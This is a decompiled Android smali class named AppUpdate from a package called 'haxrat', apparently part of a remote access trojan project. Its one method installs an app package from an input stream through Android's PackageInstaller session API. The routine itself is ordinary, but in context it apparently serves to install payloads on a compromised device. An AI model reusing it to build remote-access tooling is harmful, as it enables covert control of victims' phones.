.class public Lcom/hax4us/haxrat/AppUpdate;
.super Ljava/lang/Object;
.source "AppUpdate.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 49
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static installPackage(Landroid/content/Context;Ljava/lang/String;Ljava/io/InputStream;)V
    .locals 28
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ljava/lang/String;",
            "Ljava/io/InputStream;",
            ")V^",
            "Ljava/io/IOException;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 19
    move-object/from16 v2, p0

    move-object/from16 v3, p1

    move-object/from16 v4, p2

    move-object/from16 v21, v2

    invoke-virtual/range {v21 .. v21}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v21

    move-object/from16 v6, v21

    .line 20
    move-object/from16 v21, v6

    invoke-virtual/range {v21 .. v21}, Landroid/content/pm/PackageManager;->getPackageInstaller()Landroid/content/pm/PackageInstaller;

    move-result-object v21

    move-object/from16 v7, v21

    .line 22
    new-instance v21, Landroid/content/pm/PackageInstaller$SessionParams;

    move-object/from16 v27, v21

    move-object/from16 v21, v27

    move-object/from16 v22, v27

    const/16 v23, 0x1

    invoke-direct/range {v22 .. v23}, Landroid/content/pm/PackageInstaller$SessionParams;-><init>(I)V

    move-object/from16 v8, v21

    .line 24
    move-object/from16 v21, v8

    move-object/from16 v22, v3

    invoke-virtual/range {v21 .. v22}, Landroid/content/pm/PackageInstaller$SessionParams;->setAppPackageName(Ljava/lang/String;)V

    .line 25
    const/16 v21, 0x0

    check-cast v21, Landroid/content/pm/PackageInstaller$Session;

    move-object/from16 v9, v21

    .line 27
    move-object/from16 v21, v7

    move-object/from16 v22, v8

    :try_start_0
    invoke-virtual/range {v21 .. v22}, Landroid/content/pm/PackageInstaller;->createSession(Landroid/content/pm/PackageInstaller$SessionParams;)I

    move-result v21

    move/from16 v14, v21

    .line 28
    move-object/from16 v21, v7

    move/from16 v22, v14

    invoke-virtual/range {v21 .. v22}, Landroid/content/pm/PackageInstaller;->openSession(I)Landroid/content/pm/PackageInstaller$Session;

    move-result-object v21

    move-object/from16 v9, v21

    .line 29
    move-object/from16 v21, v9

    move-object/from16 v22, v3

    const/16 v23, 0x0

    move/from16 v0, v23

    int-to-long v0, v0

    move-wide/from16 v23, v0

    const/16 v25, -0x1

    move/from16 v0, v25

    int-to-long v0, v0

    move-wide/from16 v25, v0

    invoke-virtual/range {v21 .. v26}, Landroid/content/pm/PackageInstaller$Session;->openWrite(Ljava/lang/String;JJ)Ljava/io/OutputStream;

    move-result-object v21

    move-object/from16 v15, v21

    .line 30
    const/16 v21, 0x400

    move/from16 v0, v21

    new-array v0, v0, [B

    move-object/from16 v21, v0

    move-object/from16 v16, v21

    .line 31
    const/16 v21, 0x0

    move/from16 v18, v21

    .line 33
    :goto_0
    move-object/from16 v21, v4

    move-object/from16 v22, v16

    invoke-virtual/range {v21 .. v22}, Ljava/io/InputStream;->read([B)I

    move-result v21

    move/from16 v27, v21

    move/from16 v21, v27

    move/from16 v22, v27

    move/from16 v17, v22

    const/16 v22, -0x1

    move/from16 v0, v21

    move/from16 v1, v22

    if-ne v0, v1, :cond_1

    .line 37
    move-object/from16 v21, v9

    move-object/from16 v22, v15

    invoke-virtual/range {v21 .. v22}, Landroid/content/pm/PackageInstaller$Session;->fsync(Ljava/io/OutputStream;)V

    .line 38
    move-object/from16 v21, v15

    invoke-virtual/range {v21 .. v21}, Ljava/io/OutputStream;->close()V

    .line 40
    new-instance v21, Landroid/content/Intent;

    move-object/from16 v27, v21

    move-object/from16 v21, v27

    move-object/from16 v22, v27

    const-string v23, "android.intent.action.PACKAGE_ADDED"

    invoke-direct/range {v22 .. v23}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    move-object/from16 v19, v21

    .line 42
    move-object/from16 v21, v9

    move-object/from16 v22, v2

    move/from16 v23, v14

    move-object/from16 v24, v19

    const/high16 v25, 0x8000000

    invoke-static/range {v22 .. v25}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v22

    invoke-virtual/range {v22 .. v22}, Landroid/app/PendingIntent;->getIntentSender()Landroid/content/IntentSender;

    move-result-object v22

    invoke-virtual/range {v21 .. v22}, Landroid/content/pm/PackageInstaller$Session;->commit(Landroid/content/IntentSender;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 45
    move-object/from16 v21, v9

    if-eqz v21, :cond_0

    .line 46
    move-object/from16 v21, v9

    invoke-virtual/range {v21 .. v21}, Landroid/content/pm/PackageInstaller$Session;->close()V

    :cond_0
    return-void

    .line 34
    :cond_1
    move-object/from16 v21, v15

    move-object/from16 v22, v16

    const/16 v23, 0x0

    move/from16 v24, v17

    :try_start_1
    invoke-virtual/range {v21 .. v24}, Ljava/io/OutputStream;->write([BII)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 35
    move/from16 v21, v18

    move/from16 v22, v17

    add-int v21, v21, v22

    move/from16 v18, v21

    goto :goto_0

    .line 42
    :catchall_0
    move-exception v21

    move-object/from16 v10, v21

    .line 45
    move-object/from16 v21, v9

    if-eqz v21, :cond_2

    .line 46
    move-object/from16 v21, v9

    invoke-virtual/range {v21 .. v21}, Landroid/content/pm/PackageInstaller$Session;->close()V

    :cond_2
    move-object/from16 v21, v10

    throw v21
.end method
